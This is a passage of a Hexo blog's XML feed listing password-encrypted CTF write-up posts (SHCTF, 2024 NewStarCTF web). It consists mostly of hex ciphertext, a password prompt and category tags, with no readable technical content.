71a04e7d11640a5c81b00c2dbd944fc36651cf80987a10a54ee487b77dcd3edec90819d85f457c85f8c01bfc26bc9007f2a534baeeef340e5365ed4b4db8b01a7c02faaecd84a3b7e55eab8fccbac328116f59abcce0bfb191687757aa6c6aee0c75d48c66e3c6d4e861303578b3695575d6872b1fc2c5314cdee7ae7462295921fa20b2b009e8cd6cf0e44021b0faf1533cc99f6ea816f530050803a28a33027377049a682b4c281297e707005cf9a24ec727cf5c07a4b31c32b0bf3e781205029a46618db6dfca1d3315b44e438704229337285f39d93b3af2fadfa445d8e29ca98169fc098b4ca7fe223b2fad28a7781e798cf318551db3925e53ed136f12ce551fa094dc5a0d7d629be8f8f75fc801bf1aa395ecb733fa84d3b6933e13d26ada2ce413099dbc6d666ae5b573d52561e8bb85a1867bddac1f92ed8e4b37147ea0be1bf1bb866e803baa359c0b02498862fae4e3d30bc983edfacd57e00f79c14e7242299326a7b7a4f9517ace887b2d59ab65a1140d3d6f5bd71c0ae0d1f99e998c6f57fec5e29ce4468857cc9008183f2436ce4b70fa3f432a16e59b61921a2a12c0f119a4ccc223483267fdb3944cf876c3becb502c6356d347c14402ef2125af889b053fe9599acf2e4c2dc41f3bd904d3ad4bf8ecae0dce22a63b018828199ce69c829cfb0513a17190a170c6bf41362e1c68a12b414e0e839a7b59c09e4cdce2643851ea4f169a31594a6cf80be3e1d6ce5b648f587eae80c663dfeb3ef28cbef93d046211b12ee81b1de974b4d50674592f3aee0055997950a28d38000d26a4f80de89bb3aee2be87fc5795444e9f36146f6eeb97b9532231a5731737750c100e640173858ce18f2d30134165f5de64cf7640e6dcf0d19b167803eb0882e44b85872374e708954397099ac49fa912de30df483d6ecf5b803b32b07a7d13b18e2e134ed06f0a9b88f787876e9c812ceb5ffd23bd7e3a7b60700a9467401fde36e4e38e2cb2e03f8b4f0f6ff05e9f6387c2670d4438ff99a9d3e36a428f58906e3c9d0b5484451e461da5f7a8bd23fac39a6805c6fc54bc07e14f889c675be4bc614f81a5c0df54c5a45a9f292f647496e67dae9f776988e8dfe47caf5972c89c61eb42205063d9af36f922092aac42b8502178a222ac91013dc5a5bf96e1f3d89de8f14d9b7bf5319cda2ffee8f83e5f65550cd8687c45405467d6c1e07c4469949679090bae72e672e26ebf88dbaa6373c9987ba7480eabfe74b8f893e251f4a09ce42b71a11fcc0719f2cd44b86f6b7f2061964a3b3b869350ecea0c7aaffdec46809a0f46ce0b64ce89d48b6fb03d42febe5e22acac00e4eb99a873dbad3d46a93a01f015b23a7ae632daedd8cd95be82a5a9d3d575a549cd7b399d1bd07a954c529100c907a479537a5a2a9926f0190a3444573182a50e38a87ccb2896f08d35c6c03ccf11195e4e2d893085ffa7c9ad57552ac37c7762030392cc19648cb200e7b25d99e9596f30c22dd3e02bcef54e95e5d2ef38bdba3b87fbcf0a242cc2dfc1ece1d1c18a037e32940cad15f348efdf558ee9ac4cb138242c10aedd3f6eb21544a606340a0e9c3c6fa8c85537e6c61853e369a1ce4d9f8f94afcb9f5049ae98a529a5fff2fdbe3787786d161d0e32952ff33a86a60a010aab2d4b7012c86a58293aa84442d1dec5521eee6628412cc0aff692c723a8e3177ed5df91b37e176ccdc47f5ed8a506948a0ed91797ae517118b8a2e0bb4104639b0970b54f5f4fa71ed9287444f5a45245dd58b928e887f9343ccc69abd17ade8258c75916bfa333b4a395d3bcfe7c93144e09b73915d8cdbbdd5256e6217d53a6d1b6b3dee43333db564aaf74856198803cb9bde2abf6220e88286bb1e3a4744315148a5ab44785b40e84ae8156ea5fd89a4d207fd94945a941450d7680ce792245d2cd598c41338fceb025d01e2c9fdf4d7b354fcec694309ca01b2297e627cc2dffdbb58537c805b8c2a7e5f21b763d37cba4292b1b8c2d92c3f2a704911ca2a8417fc337c4f03e8017c322f4c961b8d3ed7bee2adb8b1f829e08d624911137e4fcf28a59c04376d1515bdea7d6b7f1fc733db391156e2add05d30285f05a05893854a16ceaa3289c1df53553daf3e7ab7368fc37a9254cee27fc8d27d1989152fae09ef0ed4b0093eb7f2eb9f6ba5b661fceb6752b202fe817199c8e4a0d7b30493cc6e90d8e33bffe28543d4454cb5d89c3750abfde9fa954a4c22e0b0fcf58ba537999c56cee904b8b670f314f7623c2aaab405cb29ad2698c8b0836f1b2484dc8acb20d63c5c5a47cd08c1ffc1837146c1a17acad33f0c53901f1e867f5c97b7cc94a660cca13993766e8d21fe36f0bba673184932caee7996cbeeb7bb559d1930ad24c910f8bea86a4623920d83fb29cc01bc05ea8d1cd0a385478ad996d325e22c68b703668e9df0136552f8fde45cac419af7f7524cb8b4dbea944bb7d40ca1d37930535bbd6f9dd22d26a2d48ad067baac3e3fc164df1a78140a5723c0dd0f86ecd6e7abf484b74b6058b28a1aeb7336fa19edc5f40f38873a26282d60cc10a69ad4fc8f39de591b2bf676c900b422606405d0fdab9a3eb0ccd5e3a94fe07b73a9dbc87bb77765ebed27592ad40b0c920138dcc352fcb7136da9c7c34a69ddfad57a4df3dfee7428c85653745696f8f88e10810e3a9d831280ba9ede035eee4145fd40e06488e4490acc5b3239cbacf26cc477d07c12cc7da14067459f9d153b56680a3aa111a9ba2ff2cbfa3f8cc81589f1612a95eb8c812e1ca3cec4b2dd44b626788756a6b11a998c6261964e9b13045086e5f6cc31154abe249c8cb65bd96c7f1b18f4388edde0df6abbca387c9df0bcec80d6fd311f78ada194dd79126f6728c6168cc62f296ab8eb48ec4b322c3fb3a29a8db5a9bb6b0bad863c676e316617a29f8019b2617771fe0ae06dede909523560ed3740e20e108a455ca67d47ad657bd961a1fe20ad2186b35a859fb05d1818f0d4ee19df6cc4e8b961838a20346e5a50bc32413446a4597e67e4d9dfca5b5b7681fe5bfb8d1e987496eea7e62090493d919ee72eb9ed1f86492d7480c3ad5acb2341133140810e8ed536d407ab871fc0c195b5fde006e64ecd7779ed19a9ce06e6cebc1dcfce1f3f42c19a71136593b24992d24c1097bbbd86cffa54d479c6849fe7aae7bb7bcc7f4ed59e293eeac4c5821cbce7426e1c13cf1fb6118170da31a8c6372255f818638fd4bcff2b8290fb731773baa95df8772e952ddea9f571397add895b4be5bdcbbf59d2c0c1633bfea0826574dfce7ed0d50d57a7cd13c657037f3b47473701ebfa2aab798a526da9c223384eaa8e9bf0faa7cae435eeebafe0e0985114065ee63eae316cd61d3d57810641ae47dcf75332d0f53acad5fc988d86865b10c9b6e2d1d9b0486e4a555eb997a5cdd72b703410b473f1a5391d72c2cad8b66ac6712502c3d29315a4249b2741eca70d7056493aafcc204bb8dfbcfb266695f933d1804724e89b4226820da0278ab6b89961e9f8d013e92f7c2e381251f645e957ce4f7be1755176696d6ee809fae979557439fc2b20bd87bbc1360d469e50e83440c97f48a8433366c8409113365bd985a1fbe08396af0ab54a61edd1b70a91b3282f0c7c2248d7026445a087c6459630e9f5f90ddc604c4594b94ae16f473dfea7429497014e7ad3f450c6191f3d2f0508b1a9ab7182bb4bba6ef9ea4ade88b59b83b1e8b8a18521b22ed6b405990f80b13ee01c1b74a7f48783848647e41cd4febd411f689a67e183ea1ed3399a1f89ba9a1237261c3492484881140db44f2e11863f76a11d21f6323259c70d6fd55b31c52311f199a3a3aa320e691e7630aabe7c6a235a9649fc1676c515fb2caff74f2dd20b1826c5aa5652420f4cebbda9135b4eee728b1d2c043fae77bfd47fb04685be5dc8900723a91848909d4f99eac8c7c054af518c3634079d3f4a3c737ed07a44206948a36e40707e907789e72ba1ff37602b7476e25ad5f317c19c394555d4ba357a932f0a03ca9f4ffd443e8205a7263bcb6196bd76ed8a6775c02cdcf3bc6a1d7114aff57aa3c8f461ae2bed6c9ef3b601f282f686b7947288949ce1cffc3e001af53ffd331146b85f7c21ebd507a7851caeb975b5a0611387444c0c45a600c516fd745d625e5598a9c8493247c3ab4633cc8b23a0527c6e159dc4fb2f5c969201264cd01df723e0954b88beb351bd80cb12a32bc2e28194c87a6ddbfc9c500634efb03bfae82f105b212a34d53ad5a40e6fe095825f0fcf22d404907ba5de05a989a2337aecd8d987201fc902da32ae81105cafd1eb7b33f9bcd6fae9398916ddc7a23e0dd7f17714de35b54b26a9ef8591fc8c245eebd4bb08595b77cd7a5819c56f185ab37ad5b19781ecb63cf22177ca5682afbb2974851221b0cd9c61c0b253dddb9157477720df60b5d7ff614d97630be2007ab2388191852da0e2811c1bdd189392a2c68f88a3f0bc2dd521c480006c81c4b72edd5e2b2325a6dae701354db9cef5ab4012ae6bbb978e221048a6c068d6bfd6b80ff1a3a2225f5487145615cb271e130e215ef0526bfda9cbf2cc4f1c78aa4a810b13d2ec53fdd61c9754c4066d0dcf0a09da0a435ec9309a3a204910ba9d3a5724d33ca3acbbab3108f040736d4fa651520ebaf6a63674878fa1f4363df59c86033db59e635a52f4cef15cfbbf8b625d532d98f0fccf8cbdf8ea75dcd5381736c58cb0ad4613f812b500eb65b43deffcab9f11d74206e934270bd5cd07b059ae5a4a6afc266348808026448fdc35cd9b2518a69a95ed8dc7cba807d70b57799739c1540b9586364361f8ce3d4f467c63b83311a83768efe7a5f286d82372b762b33fe777573abea1a7b7b2d90d631462c06836e1358aa5199d0bddac9524a7bd2858b16064f56d0bee512b524f4475321e472bda11f15bc74ce11a1c5822179d49819667ec02b0873fa24c13b30f0e4dc07e62bec1a4f9e4fdffebd132f8a5e02c9363afcb9a246290237af2df5acfc2b0666f9815c56501c8c186b12935d19d5b028e17f802d5516ddbc10645e79f96df0abfe2b01def52e28766a289bfe6ab5de2f0f5bea9a95f53d93175ad4c4972579be406d0c864a83e94346ddb2ecaf62f47dfd4474479efa55b1f37193233e3f4d35119bb97e911192f36786dcd2a67341752645f3f3ce02bdaa5318d48d9d951e08f553056d629d64c36b91bc343f305f558fa53e1b70dac44e0c52a1a5d12e8c6ea5c8570bb48afc4439a8e1e908b81cb9aa4b37b92b17bbba0e22fcea55c279b63336b5e237da089bb2d01bc5c350172039393389014997096b7a197101db68de684d4c21808bc49b0ea91783c3e1c83ec64060c752ee8e228d20eaf7443cc71fa2b49573e69711ccf140a3a9955903c448601f857243e72af2ca273bd842572c68e199914b708a2e93f3a6c8c3dadbfc8a96b45726c96709b1c9628ef4631da8863f6f1a0ce8be5e59fc465e85152f910a174ac15333cef3b163ac8cfd094d6afd69229280e29cf6dc590d44eee12d45d52461f6a2c0b768e05ccaa4931dffbdc76884ae247ed7da7c53a6c0be54c5869051e9964f6729d10beea2072df80a0d2ea8e15d0d4b5e34fd09bebc1c5ef042f7d27d7750bdbacf394885dfbf90886861a4fd7ab7e94b1dd72f44fb65dd0b53aa1e6a7fc1e9c066dff2476360d3b7df3eb8a2030906dbb2b15ce20d8cc6010e41aba55e20e4ebbb208c00c12ae7d8ca8ac0b89a877b546f1c22aba9027aacf44c309e586178a1a8cdf96ecdf2956ecf824a32f91cadb16a3f8ae79d1545427de57906257e3723bec8c1d7c3de44fd7c39905daa2a378d4d05b7ed03c5bc35ee1a98e521119ba26bd37e4a86ebd0c2fc085dfaaf745d125f979fb4d5cd9a4ae2aebae2a8f4a547840327f7eaf0d89a9c3ade8d9d909af02f3779d9a458e95655dbc954bd750f5804b078af2567cac8b916352a13fedfecf8ece9c54bcb671f6041989cec92aeb03d390ec87cbdb39adbdcb305548ccce123a6402446ce240ed1def323373443dbcf12305a3ea7d3535327311d6da6bab744537e2dd3cb7d0f243c29172d3174c9144546f8290b94bd4c74de5ceb5a9dfa77fab41e48093925fcee2ea4e43e09fa7a0c90a37c7414aaea7d3fd846d0750dae7ed6098aff34089ae48d94fb5cb7b0f9a402a31f90d453111de49acb68806351f4b3cb4995b106dcb9f0f60fd1217fc345c5354dd5129498f0010dae48b821ade22ed3d460b7db314b627de50c6c6c758372b05f4b92502e52ebf174545f351796b711f44368b58ab6630282cc7be8377b11f2c486c01403be9c893feae73b880ec374e3e2ce1352c7b7a4a85e45ae473bb6d588ecf3833e508ed6bae8c47e3f93caeb06915edbdfef2b693522670c6daf055e579fc314171236d5d8e32660b4374cb28cdd92e611a736140fc53feef6676a65a9b8177415dfb365704ecc5329429799cef3d932b73a006298ed7ef9118b1650ea87404bc171a95351a4d9c6756bdcfed7db91f7e8e75871438048562ac66382078fb4dcabf4d35722701462034bc85b2a69fa109b28f97d3aae8d4bcb384220f868bf0ba86f84870a292b94b068b450cc01a4f9cb2e63f2520fbd47a9de805fa515fe0f24cb148e8c8b8fee02b02f8d99a2dd757ff6ff5398c3bd5b9882553c9e5f253efd19fb6fb313480b31c4526712ca1cc5a711de1d26395c7cdd9bc67329be8f261627d9587ea6cab8575989683f534c2ae9bf3a6cd0efb3f1580877b01ec2a1af794ef85a807aeab01bf9f2ce65143b2f41aea14832386087e3133b4a0e1914dd5c13514236a3c14897f439b716ac4bebb8393a42fa3434f38097d837466f747fcbbf84dd1a7b450843c47278dd23f647a9dad8156939b4b0f06c2876f8c4061aa2faa654cf9ecd97b8adf1a7cc6346e76e55cde739ef70b8ca004bdd00a4f46c8b134803e5eeef60b54b79cf27200c7a68ebea771e96ac78ba78b1c24f999dc9ac344da8a9954732c01336dfb1b3d3359c307c50a0c59027760c3ab5c797ac47d2d670b54fc9201047ea20dd2826fb4ae9c036de0e9fcee273be9db837ce22c801ae21dfe53d8b26cd4d33dd264a3da062b810b5d1e9561bc2e92e454bacd4c76b7f3fe5de4e76358f14a02085c602aafeb0216f536a3a105d89e2d489e66bf06703b00bc80b90b06eac915dc575716d861c916fff521575ea818edb5ae2c2da0e4bd1db88b41f0f01aa819c0087af68c85322c22ec3188aad9ab66ab3527203a14c84f006ee50f7c464f940be356e934423de6952a4e10d624cf24f21c50da71a34a65649da5f2317e697f0564712be1c960c43699bf27618d5e2b21b8a48fbd765f82d8f46a1fdb877b8d7e52438edb6466bafbd4c30928431fc154544addefbefd5852d4ebfc589775e7d38a9aeb704c7af5a474e31ecae182b633c25d6e6a34ba37ae54cf26d31f4d8ef414bbfcfe0ae1b1e0d5c68322a11e1feb48d791ecb900acb32920c7b8d1cd1aa6c90cfa344a6e312b92337cd70de72afb851c48054be2b6441000bbcd330c190220870eb7e978f4fccdc4779ff0f3eb3fcfcf900ee1d6a2b49db13e9259960a8c4be2b0e5015244a3ea3d504e60376e61d33494a28a59aa406b42247994b2d299e6942151650593ff4924877a5f12251858a9ae33eb64389db6774272ae1a59fe6268c312930c8f16ea78113b6fb850307af7af076abd4d87862384ac83a42d72ef6a5d3a2504b1e050ffa47ba0665a843e6ed6f546790f8b03cf3804b244b730aa6a6444535c13bcf86655dce904c21a6cee49dd884af77df130d01acbba39626c85b4b6ef9c7dac5af803853b18009ce32a4d0b4d61d633a596d0aad488eda071da289316302e82c4468e06d516769a5ef07941059c5cdf0d795b05694aadc7ba5ae2481a5ad84831349d8b9d493e5892b83553c0b25398a350beda6352dd3d2f85037a705a915bff214b546b17373d4d2d4d7df435773c72d467a4d0cc15e999c7be79effd6aa07b8309ef0f4f2b1d0a86ddf68e6b7289c8b8da7cb81f0c0e5d21b523cd75ac8a171126b109c8d9a7c8bc6e86dd58806cca1f44c8d152024b300566872a4caf73f9271e51e7a053fc3e90a10a064775d53ee74b49e5d8b1fe2af425e008a5a1b6607a91af26c1485f4597246925edeab50565af2b3be74ea314db3b8d99b6a956c3dd7a7e5e329477f11644ad61ef3c13f58234e17b6ebe4f72e4958d5b334abc2d5807b6580c247326aab9a790990996302c5b57cfef7810a4f79e9c30cea67fd863705034823a4e378d22773d0139d9aa66fab445c744c2a90d12a6cdd73476d7c1b8365884aa1ccbd9f6ba0db3cc8120336e73d6c7b76aa9ba7e9ec1d8dde1ccbbcbfa9554efd552ecb8e134cf7e2bb513f6f10392a1d724bdbd73728ecb3ce653b9d84d711fa8c323dfe69ab614a6827a9742626b7f02a0c04ae9ffa043648d223251196c220470e5f77239b1d5cd2de8e1c0101fbdba65fa33b26ce939a557a10b615d0918022c366017d4c564dea58f5853b060f6011bb4f89d949abbad8b2943145c2e239c83bd4a36cc7c506beff8fbb4dc9fe415ac0ea0aa50bf5f0f0ad2066208bed8ce66f0ffd3f1ca58b1c61d11ec38c52d5ee0e79b65ea801696db85d9f7b987d3d35ab4c49526f84946b17da98d9351721a55ea6711a258244e677c366fea2e8bbd075ac272dbc324b9fee53bf01505a5d1cecdd4faa2cdad0926bb155ba030501ebcc17e0404f036534fa4c543f158d4e779b3d1febc11cc08f0d183768a2df913a55209b0793ccd39f7f8d8c75d637036c9ddddd3e940f34afda312cbd14cd3fdbce1ef496bef4560f0379985dc2a4dbfee50942b13c8bbde135d1dc4375afc0fb7ecdc2f46b3d34918e65c07272af3bcd7e9d00a8c1b5efccfad270ac663a5fe1e32cb903870a62d98b324e27a7dcf49f9e2f7dce6b414759d33506c396a7e6e3f60e20554c9b40ead9a752ca89540120b606a235a88e9843876b3c9f1d90b4f8ec600f7993c6d14048c6860a1bd9746a15c3874183d33a805a192c576ad0f5d97002f8f062e11563dd6159e9c451d80699e94127259e0eefd904fb</script>  <div class="hbe hbe-content">    <div class="hbe hbe-input hbe-input-default">      <input class="hbe hbe-input-field hbe-input-field-default" type="password" id="hbePass">      <label class="hbe hbe-input-label hbe-input-label-default" for="hbePass">        <span class="hbe hbe-input-label-content hbe-input-label-content-default">Maybe have a guess</span>      </label>    </div>  </div></div><script data-pjax src="/lib/hbe.js"></script><link href="/css/hbe.style.css" rel="stylesheet" type="text/css">]]></content>
      
      
      <categories>
          
          <category> å®‰å…¨ç›¸å…³ </category>
          
          <category> CTF </category>
          
      </categories>
      
      
        <tags>
            
            <tag> SHCTF </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>2024NewStarCTF-web</title>
      <link href="/2024/10/01/2024NewStarCTF/"/>
      <url>/2024/10/01/2024NewStarCTF/</url>
      
        <content type="html"><![CDATA[<div class="hbe hbe-container" id="hexo-blog-encrypt" data-wpm="Oh, this is an invalid password. Check and try again, please." data-whm="OOPS, these decrypted content may changed, but you can still have a look.">  <script id="hbeData" type="hbeData" data-hmacdigest="3f6a1f2fad36f01fdac98e260403264e6748383df95167593d9d68de315b7c0b">a1d64e06b6ec7d31335bdc9dd4afd69a52593fe7d4db0c8bad8fa144c8ab8a1fd790397f9db6251ffacf96ad115e8620240061c5e75c0f694c7943d0e9e25e94d9c283c13a2269c2b79bdcabfa71909a3a855739ffdfed8f99535fc93789987c37235680050a7bd69424e94cf719ea2d88f278fc7b7300e8b33c5b7f26a4cc079fd36a067316c2dc0dbe6422c39330371808c13493c775bad23e691d5fdd12fc51fb3027bc0d25e032e46422df9da3c42d8751c16215a7bfa11fba49a0d03369dc2eab5e6bf6ce5203fe800229ed2f28c4f2112ea77dc8953d5c8da505903b2c4fd0951cf6e0d9afc9d114b1a2eb0cbc0ca817b7ec55d2a30c5bccf171a837bba681a258aa5dad22a625b9a64459a518e9dcf620741ff661cf56857f021efdedc9bb3d47ec7d40ab15c8044f8e0e420711de082320bdd743e5a00d38244ba10cc4c867abe88233523192b5acb84ed081b4b078e650e2370a58a04d78c8668cb5bc6925f9f7949d2f698ece0fbf2e333d6d0cd63b6d6ea488faeb768e83e7160d44ba0fa07334ca3c46caa649f47ca032a511358f92f336afb84a85c22bd8f78cfa2d52b0392ffe0f55cebecfd71847720bb4486aeb9429deaebd2c251bc776fe0982b171fec60a2709031b6fb4de2252a50a672307545c74d6c98085b91d5d6a5da84a2c7d38d826cc62ffff1e446e2bebcc841c5ef5cfa3d5c75bade572d878cd56fa1bb1742eb49cbb0dd6774112f7e15170490a3ed6d11d615d7970e4ae898042574a0f237cf135eed9ca9110fc2cf3cd16b50f6fe453a37c1b8720d178a656360a0cd7487316ebfd3a9f3e670512dae2f9fd6a401b993857b397f24908b9fdc1900fe2ea8611ae432dc1557ef875c50dd604dfa235d972b1c4d7bbc18379a71f94e9ce844a7c744d725eb742627ff51814603ce11edde8d401f91087e8a7734cd3cd179044c13115618d9efd599857eb9a27f58faf90b0d2183d39473081e4317df6a300c6b0b04e6b859c03d278e18b30ddf2a2b2a7b6e64f4ec35ca6076b8d4d1caa7162f70e21ec1c24656e296f6a794f729d5f7c01eed880d3e921bd4579208311ea577b0e7a26526388b290241a936ccc394a5377cb0112d4bae37205bf4fe30621451adf9b2b30d986376c192125e8619bbb7d9339a007c035fee1a0980179cbe3a71b1bd50570eed9b39d7e356bb8fb0d3057bbccf5da7adacef225c9a92c2db1e41ebaa5621fc9a86e7700c6bee21bde68d436c82753893b73d6575d3b1849733ffddfeea8c74fb8e5c39699bc778989aed29f6fd866d49bebc935230f517ea4dd74eafa130c96acb428ebbde11e4afef9089e725ecab3046dec0d51c8750ecd6bf88626d73beb1fd4f223f7268b7fabfc899b6d5d2f4083c6cbc550091f90824fa1207403d5c168b51f3c867992f061fdb9ccb1cf6feb22c4f86ea957b53bb9ba1142cd8db1d4671f5ec9c79c67ba061f640a49a299675ba2f09402d168853ebfc59cd3ab5e7437638c134b7f028931f04887d2c0616651c2533910039081b0a90cb479c3124dde92e1db866f4dc8fa4594e8f196c474a2d5227f1257a0b7cdcdc3349f52009e412690ea50c65e5a1a51ddc935f96aa5d6d460b292b3e37cb3ee3c62ea1d93eee5082cd4774c522f3af0c51543869ada2b240084e5ae594c5d5ce0889819b16926ddf794fd5fa6ecc04eda0dc6084da16c8be78ee119590f9d0927a0218390973d7b23fd2a69dedfd54a507fe1266584e31f7157f5e4497ba516f07406dd0a2b9608fc76b5a50d335a393beca82f6f4f9516a61dab08c411a6ac6408b8c0a88384356c35c1f548996131c45c88c1f379fc19fd20767d7aeee16d5d0b9c7f51715dfdbd48c34c8522cf1cfadbacf8fdc54d38d5e445b3c8ad8556ba6537ecec689a4f1fc846ab20c071d130840b2f713bf9802a5b174af1fb09f6b6866ff7adedd4bedd88f39daf1447a54c9d8f206048c4151d98c784b3286fe5daaa94993af9e0da2acd883016518de81392606b76086fbbaf3213e4ff4b02bf3457271688a667037d0280ff58ad514d10ff83090e56acc81b7315a5745cadcb42b46ff3746637791ae21fff355a61493611f314e987e591617f5126c37493f8f4863bce59a865102e3c4334e314d28e8eb3479ab858a2305e31071adfe5595e3ac40fd658c0c46be42e0e1b9b0079e99af0694b0318d03059e1083070dfd2b9b2225cd35809797aeddaa2844d1f1f10f021bf54de8ff4c4a82a186a2165874cd0b4b8491bdf6d7682171a11eeb6ec50ae398545ffc60115fa4002c109a8e7d1e083b1b074ab4436fe76ff408aa6bb80555ec4b719ab81bbbf55447612866e10baa589be6250227fb963bcdbc1ed1560ff80ded74c13c0e55498b78752fedc0ff885f2fde867e01830293c2362034ae0a90653881f371624666db1ee9ae7e584e08f2ef27f1523054add86755d88c9485a5fecf8866ab66ae63ca5c8d43fef1c0a2663cec056b669ed5733680064bee413271bd9e65989a4e36fe15dfbd5c662b908bdd15bc9a950d056084f8d5feccafe1b026ec6d4b1896cbdda56e8b0f07e79069c9f06e6ee938411f0025d6e698705ad21fbe558b5c3985081b84b5daf96179b3ba361a195d5769940ab6d5d519314d6a7c3d4ed374b6ce6f7ce083723f32f20edbe19e91e5ab0908f355edf0a9fa238eb20ccbeb658951c07d41a72595a4864315495a20cabc9dc9d34f210bdf99489cf2ad321b528de0b127820f4f20d1d476053282ba35226384637751e87b3ef16105f5598dcf6143181e2aa0704496e7f1094578e8c5ed89349300b55ae4829a7d660482b2b770e80389850f69ec599439c93e76f852da2c6550b600d2ca552868aa48548184f782f0206e8808de79763831aef8a772eabfbed79e8dff76e2f909afb78dd8476f993f15da4639ebd33505825f79f765606e27bba2a18bdfb1a6b9721cbcf8704668e2e64638943cb5da3068e68c44e45a4b9ba145f085f5145ea891e15c9bb44632d24e2191fc3b643b54878fb6ef2f19bbd00df6b051233f061983d1d46cab5a9c5d9b73a734acc538686a2e8846bbdc291d36d61d76a54c3d074719cbeecc3a8441a8c4be2c674ca113a51c72f8c6f441ebf22ce6cbc84a30266f312d548c5b6265c908d90ededa7ce3182337926a7fffbc9e64fc55f5693bdd8e2123cb60f238f1f83a69c7a28ac21db20c258e4fc96b8cb17651ad9b7711f9827ce2ac9d5ec1394d81a80c3b58caaf327970ae2a6efc70f59ebf76b9234a05d164bceb96050850e2d5a55b5e8c164f2f1dbab3095c610bb76ef97e01ab4192b2fb9b0422bd0d8dd525782e5a3097f6a2f13e37594f89ee8cc111b8592d4f35ad28b5f8624e3566e090224b15eaf3f836c44f6cd5908a49dc5a17835bf1b42f70a4b872483b181334fd11298db1bb309516e7e6eadca0c8fc357ce1ede0ac129dee03261fda59df1dca7a5086638793052e2544aa155c5b53d18dbda6e5a1f65e58789654a4d7264277d4a1d8c5d1c81a3230556c254cda696c52341dbc6707b10388af938df28c4960b92f71ad67a35b782d356e58a018e1d895dc3b948c0db4d922d2306749ea273978d77bd032436c68e40899a8113f150714986b6a3589d5eb8e2cad5ad9c632389bd613f31053986c1859dd4cd426e85f9f67909bbfe84fa408d24836266fbb708dd6cdb2478dd294039905909b8da6cb91e951126bffc545d7f905b5963b61885f986887b570c86c70f2ae02037ba5e631e59da43d1490824712e05ca49107e7e4b77957ffecf3854a5ff4ed716832d3c640f7e9a58a0f61e0d58ecb42225f5192acd2e5cabec36c75487a4ad8b1c3de20fd22b9772235c18369f8ac58a25987e446192fa48560625177e185abc2dea98877d0b76810fcab142a2998c3c1f06894020517583d07b495e4ec7acbd181abad49fa2c74076613cadb336f25b28c347d129daad9e59fa85d1b626095db75fcfc2058f647f1445dde62c73088d5db9328015446bbf0ef1a5fffcb1c90af847e622d579436c9dc28ad2c150c8deba7f341e470cf048023bf3a2d98b997ee4f611b4c0b2afc8a7c6e4abd592cbd8e57bd398b2246d9ce953c12a1685329049105ba101fa4b7c33d202f1202e30ce153123609eb832ccea6ef39cc08139616a7eae7b03e34e4110a104ba9eeb10c10fc3380f1f055159062f03193005ef8e33a6ef20287e9af0ce2413d756a13c64c2bb00e0061f951b35db17c78bbeb71978d5e6c4e960bb0f4e36386c92965f21abd74b3b91f2ca31a6c6c678b69ab972c6515424405de38f377f4b2b160b72f841d2adab9caa48e04bde12d463e00c987619e9f84f363675f46fd391958021276bdb400dce2d59ff1057b03a4516cf7b4d5eacae3c04d723f2d723e206a465a565e23a6294c33c7c138f67e72a199ac2f710c5d04dbdcb85ab0d24672c4e162de461a9951f47c79773b1391acd92a1972908d6196c78d224a2b1d775f60d5f625602fea05cecb981d80bb14c792166ee91f99e533acdb2ade5537256596269c85d3f28e017f8fb7ee3c095142e8af89ae41b7a8d60055374801042bf50dbaf6dedd7a1b0487a71db907311764640b03cf1f22af793fe6d494dc587655a06f4c0d54c13e9f19156e224f95ccdb9deb013b3fbb614a7aaff5bc1d327ba36332e46df66d2f24082836cbb4ea4d894d4c16d3a19753f05b7252a03dd1d8942822e6ce037b51c0fcd3d8b750045ded4987b64deebe0f6a0182d8a209389e823f5dae83c128406f2e235da3b65c317d611509d4bbf2966021e94761ee47f47a4ee5ab7cb2bc51e815b6dbeea00b74caf37f79191c2b6fae437feae87b1cbd9f91b352702d4e5e9383c525e7c7cd0a32f89d8b8c2d1692bfa138eb45dc5a9de5d4a352eaa9659d431ecef104158b960aa2fdec7351dd17f65b7ff88e24d356c8c9b0331c84f8f215df75115a689b58631fe59edf4c3c75567510c403aef9726222785535ebac7741e5c3e3aaef0a4573c82c11dcc01138579e260e403a896e37bf92aaae24d5f5f88b45386570f4b9e6a5bfed7e005628d7a448de7d8951e30c0c5e96a33a2d481bfa7acb45c42f4c49b03c1945481a418d77610e6c5c6fe97fda6f4618f5f6c4477030e4abee003fa2992ef98fe341f4f2a8d121ea6e85d971dfc5f7a9caa0ce200815f499bb103031c7fafd4046970805e56a6d73e7bd59c939314ec04a321e9d79c38226e7481b30803ad8e7dfd1f91189b9d88727a102c2c480695674696d00b32bb52b23bddfcc06ff899e34416fdd9a1b283a62c36b28c64cd7a501d9df81bde87e279a1f2e102f2449d4c7e7c0813e112eaada5ed9dfdba7f29ebed32bfb18453a096e680cc72abb653920772ee073116691364e839770be2b3db45598aa98a41596623d339d196e073df76c6c4fe5ff6391171229bac6a7f7bb56edd802ebdff5101d44a81def046b53d25cacedb1ca4846a981ea306638294c5390c6aa69dd40496f0bea5799e6ccc4270d486453c0d7a5d2265adbd3b15b9afc48fd4a107d2fe23836c7509ac5b98c39826285af8dc7833f63e29888143a3290f81cfa5cd41dafe92cae8025ad00de3bf0fefa69622d32e459f969f90015975b979e4f012e5e7042ad13c9ae3af6fab83826c299896c8e54f00c514e978d8bcbd3b59b3e77e952ea20585e4b41691763fd959a5723de255778578130b12d35a437690163c76c59a5c5c2eaf2c57ec028eb073e4c3fa279cdcec1e30577d713529bd119c535025a1c6ba1c8fbc76e0daa9bf5c7975bdae4504506f7b28e6c5b1e7f76a4d865e83071fac3df549ff6ba54ab5c3d1cc7bfbf61c7a177760d742deeac14c93309f901eef87c5692a996b3410e769d0a25d21a7a8c4381a631df6fa186a74429a15103b19b7b0eedf24ae01d6c6adf910b46d6605e0adb10de29b66ff3ed543862734ac7a64bf31883e42179f17f696504f03dbfa1ab98d05769aea8444196f771551df727aaccd61d4bcba39749be4c529441d5fe41a512b27905ec88b2895153c694b9223216107692a1e168a2cf978bfa5ab054a51eeb18e65ca36c884676480ea25c285005fb5234a75ee66bc8798bccca2319f159ca468df20d01a046aa68beb91d826f441df2c01f5d6958752f8cfa2758683a5feef9553a85f0532192e6b84211f62c7b42c704c6072f8a8f81297c000d1763a80b0acd93c1ac9937c7623ebe23b4d08d21b769239c2210cdaaa83fd26dba49c6f1a799792a92d02ba776c6585f779353b287ddcd2a799954dab6bf1cc5058ffc98e5a0e8f0c5fe885b670dfd9cd44cc19fdc858be1562d2f9e865eeb9f10dba7ad71a66f3b3e10a116538fa336cf7ea277c41b932ab13cb4ebfb5bc45d50c2a6d8ee11308faca702463259d1891c327741a4f0502e3c7f64fdd86c21d8ec7b546ff79aa7fa70f362e323aee0b6ba3bfd63e92cfe3